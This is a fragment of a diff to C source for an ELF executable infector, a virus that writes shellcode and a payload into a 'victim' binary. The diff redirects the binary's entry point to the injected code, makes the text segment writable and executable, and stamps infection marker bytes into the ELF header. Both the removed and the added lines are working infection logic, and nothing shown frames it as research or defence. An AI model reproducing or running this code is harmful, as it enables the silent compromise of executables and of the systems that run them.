-	code_suffix[62] = '\x58';
-	code_suffix[63] = '\xe9';
-	code_suffix[64] = '\x00';
-	code_suffix[65] = '\x00';
-	code_suffix[66] = '\x00';
-	code_suffix[67] = '\x00';
-
-#define PRE_LEA_POS		0x27 + 0x100	// pos of end of lea instruction
-#define PRE_CMP_POS		0x35 + 0x100
-#define PRE_XOR_POS		0x2e + 0x100
-
-	//offset = new_sHeader.sh_addr + PRE_LEA_POS - base;
-	offset = 0x1c;//LEN_PRE + 1 - PRE_LEA_POS;
-	
-	for(int i = 0 ; i < 4 ; i++) {
-		code_prefix[(PRE_LEA_POS-4)+i] = (char)(offset & 0x000000ff);
-		offset = offset >> 8;
-	}
 	
 
-	imm = req_size;
-	for(int i = 0 ; i < 4 ; i++) {
-		code_prefix[PRE_CMP_POS+i] = (char)(imm & 0x000000ff);
-		imm = imm >> 8;
-	}
+	my_memmove(victim + padding, tmp_offset, REQ_SIZE);
 
-	//code_prefix[PRE_XOR_POS] = xor;
+	pHeader[textseg - 1]->p_filesz += REQ_SIZE;
+	pHeader[textseg - 1]->p_memsz += REQ_SIZE;
+	victim_header->e_entry = (unsigned long)(pHeader[textseg - 1]->p_vaddr + padding - 0x20);
 
-
-#define SUF_LEA_POS		0xf
-#define SUF_JMP_POS		LEN_SUF
-
-	//offset = new_sHeader.sh_addr + LEN_PRE + req_size + SUF_LEA_POS - base;
-	offset = new_sHeader.sh_offset + LEN_PRE + req_size + SUF_LEA_POS - base;
-	offset = 0x0fffffff - offset + 1;
-	for(int i = 0 ; i < 3 ; i++) {
-		code_suffix[(SUF_LEA_POS - 4)+i] = (char)(offset & 0x000000ff);
-		offset = offset >> 8;
-	}
-	code_suffix[SUF_LEA_POS - 1] = '\xff';
-
-	//offset = new_sHeader.sh_addr + LEN_PRE + req_size + SUF_JMP_POS - base;
-	offset = new_sHeader.sh_offset + LEN_PRE + req_size + SUF_JMP_POS - base;
-	offset = 0x0fffffff - offset + 1;
-	for(int i = 0 ; i < 3 ; i++) {
-		code_suffix[(SUF_JMP_POS - 4)+i] = (char)(offset & 0x000000ff);
-		offset = offset >> 8;
-	}
-	code_suffix[SUF_JMP_POS - 1] = '\xff';
-
-#define PATCH_POS		0x12
-
-	code_suffix[PATCH_POS] = tmp_entry[0];
-	code_suffix[PATCH_POS + 5] = tmp_entry[1];
-	code_suffix[PATCH_POS + 10] = tmp_entry[2];
-	code_suffix[PATCH_POS + 15] = tmp_entry[3];
-	code_suffix[PATCH_POS + 20] = tmp_entry[4];
-
-// current payload : call main then syscall(exit)
-// thus patch syscall(exit) to jmp to code_suffix
-
-#define EXIT_POS		0x13
-#define PAY_JMP_POS		EXIT_POS + 5
-	pay[EXIT_POS] = '\xe9';
-	offset = req_size - PAY_JMP_POS - 4; // 4 for safety. without -4, jumps to middle of code_suffix
-	for(int i = 0 ; i < 4 ; i++) {
-		pay[EXIT_POS + 1 + i] = (char)(offset & 0x000000ff);
-		offset = offset >> 8;
-	}
-
-	// for(int i = 0 ; i < req_size ; i++) {
-	// 	pay[i] ^= xor;
-	// }
-
-	my_memmove(victim + new_sHeader.sh_offset, code_prefix, LEN_PRE);
-	my_memmove(victim + new_sHeader.sh_offset + LEN_PRE, pay, req_size);
-	my_memmove(victim + new_sHeader.sh_offset + LEN_PRE + req_size, code_suffix, LEN_SUF);
-	my_memmove(victim + header.e_entry, jump_code, LEN_JMP);
-
-	//p_sHeader[textsec]->sh_size += 0x3000;
-	//p_sHeader[textsec]->sh_flags = SHF_WRITE | SHF_ALLOC | SHF_EXECINSTR;
-	victim_header->e_shnum += 1;
-	p_pHeader[textseg]->p_flags = PF_R | PF_W | PF_X;
-	//p_pHeader[textseg]->p_memsz += (0x1000 - p_pHeader[textseg]->p_memsz % 0x1000) + ((LEN_PRE + req_size + LEN_SUF) / 0x1000 + 1) * 0x1000;
-	//p_pHeader[textseg]->p_filesz += (0x1000 - p_pHeader[textseg]->p_filesz % 0x1000) + ((LEN_PRE + req_size + LEN_SUF) / 0x1000 + 1) * 0x1000;
-	//p_pHeader[textseg]->p_memsz += ((LEN_PRE + req_size + LEN_SUF) / 0x1000 + 2) * 0x1000;
-	//p_pHeader[textseg]->p_filesz += ((LEN_PRE + req_size + LEN_SUF) / 0x1000 + 2) * 0x1000;
-	p_pHeader[textseg]->p_memsz += new_sHeader.sh_offset + new_sHeader.sh_size - (p_pHeader[textseg]->p_offset + p_pHeader[textseg]->p_filesz);
-	p_pHeader[textseg]->p_filesz += new_sHeader.sh_offset + new_sHeader.sh_size - (p_pHeader[textseg]->p_offset + p_pHeader[textseg]->p_filesz);
-
-	victim_header->e_ident[EI_PAD + 2] = 0xAC;
-	victim_header->e_ident[EI_PAD + 3] = 0x3D;
+	victim_header->e_ident[EI_PAD + 2] = 0x5a;
+	victim_header->e_ident[EI_PAD + 3] = 0xfe;
 	victim_header->e_ident[EI_PAD + 4] = 0xC0;
 	victim_header->e_ident[EI_PAD + 5] = 0xDE;
-	victim_header->e_ident[EI_PAD + 6] = xor;
 
 	close(victim_fd);
-	close(virus_fd);
 	
 	return 0;
 }
